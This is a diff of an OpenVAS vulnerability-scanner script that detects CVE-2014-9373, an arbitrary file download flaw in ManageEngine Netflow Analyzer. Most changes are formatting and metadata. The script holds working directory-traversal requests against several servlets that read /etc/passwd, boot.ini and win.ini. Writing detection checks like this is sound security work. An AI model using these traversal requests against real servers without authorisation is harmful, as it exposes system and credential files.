@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_NetFlow_Analyzer_lfi_12_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
+# $Id: gb_NetFlow_Analyzer_lfi_12_14.nasl 5625 2017-03-20 15:02:04Z cfi $
 #
 # Netflow Analyzer Arbitrary File Download
 #
@@ -25,41 +25,44 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105127");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 2780 $");
- script_cve_id("CVE-2014-9373");
- script_bugtraq_id(71640);
- script_name("Netflow Analyzer Arbitrary File Download");
- script_xref(name:"URL", value:"https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_netflow_it360_file_dl.txt");
- script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
- script_tag(name:"creation_date", value:"2014-12-01 17:20:40 +0200 (Mon, 01 Dec 2014)");
- script_summary("Determine if it is possible to read a local file");
- script_category(ACT_GATHER_INFO);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
+  script_oid("1.3.6.1.4.1.25623.1.0.105127");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version ("$Revision: 5625 $");
+  script_cve_id("CVE-2014-9373");
+  script_bugtraq_id(71640);
+  script_name("Netflow Analyzer Arbitrary File Download");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:02:04 +0100 (Mon, 20 Mar 2017) $");
+  script_tag(name:"creation_date", value:"2014-12-01 17:20:40 +0200 (Mon, 01 Dec 2014)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
- script_tag(name: "impact" , value: "Arbitrary file download");
- script_tag(name: "vuldetect" , value: "Send a special crafted HTTP GET request and check the response");
- script_tag(name: "solution" , value: "UNFIXED - ManageEngine failed to take action after 105 days.");
+  script_xref(name:"URL", value:"https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_netflow_it360_file_dl.txt");
 
- script_tag(name: "summary" , value: "An attacker can exploit this issue using directory-traversal strings to
-view files in the context of the web server process.");
+  script_tag(name:"impact", value:"Arbitrary file download");
 
- script_tag(name: "affected" , value: "NetFlow v8.6 to v9.9");
- exit(0);
+  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");
+
+  script_tag(name:"solution", value:"UNFIXED - ManageEngine failed to take action after 105 days.");
+
+  script_tag(name:"summary", value:"An attacker can exploit this issue using directory-traversal strings to
+  view files in the context of the web server process.");
+
+  script_tag(name:"affected", value:"NetFlow v8.6 to v9.9");
+
+  script_tag(name:"qod_type", value:"remote_app");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("host_details.inc");
 
 port = get_http_port( default:80 );
 
@@ -70,24 +73,21 @@ if( ! http_vuln_check( port:port, url:url, pattern:"Login - Netflow Analyzer" ) 
 files = traversal_files();
 urls = make_array();
 
-foreach file ( keys( files ) )
-{
+foreach file( keys( files ) ) {
   urls[ '/netflow/servlet/CSVServlet?schFilePath=/' + files[file] ] = file;
-  urls[ '/netflow/servlet/DisplayChartPDF?filename=../../../../../../../../' + files[file] ] = file;;
+  urls[ '/netflow/servlet/DisplayChartPDF?filename=../../../../../../../../' + files[file] ] = file;
 }
 
 urls[ '/netflow/servlet/CReportPDFServlet?schFilePath=C:\\\\boot.ini&pdf=true' ] = '\\[boot loader\\]';
 urls[ '/netflow/servlet/CReportPDFServlet?schFilePath=C:\\\\windows\\\\win.ini&pdf=true' ] = 'for 16-bit app support';
 urls[ '/netflow/servlet/CReportPDFServlet?schFilePath=/etc/passwd&pdf=true' ] = 'root:.*:0:[01]:';
 
-foreach url ( keys( urls ) )
-{
-  if( http_vuln_check( port:port, url:url, pattern:urls[url] ) )
-  {
-    security_message( port:port );
+foreach url( keys( urls ) ) {
+  if( http_vuln_check( port:port, url:url, pattern:urls[url] ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
     exit( 0 );
   }
 }
 
 exit( 99 );
-
